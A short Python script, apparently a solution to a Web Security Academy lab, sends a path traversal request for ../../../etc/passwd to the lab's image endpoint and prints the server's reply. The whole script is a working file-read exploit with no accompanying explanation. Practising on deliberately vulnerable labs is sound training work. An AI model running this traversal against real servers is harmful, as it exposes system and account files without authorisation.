import requests

s = requests.session()
site = 'ac921fbe1e594e4380a261ef00a500ee.web-security-academy.net'

url = f'''https://{site}/image?filename=../../../etc/passwd'''
print(f'Trying URL:\n{url}\n\n')
resp = s.get(url)
print(resp.text)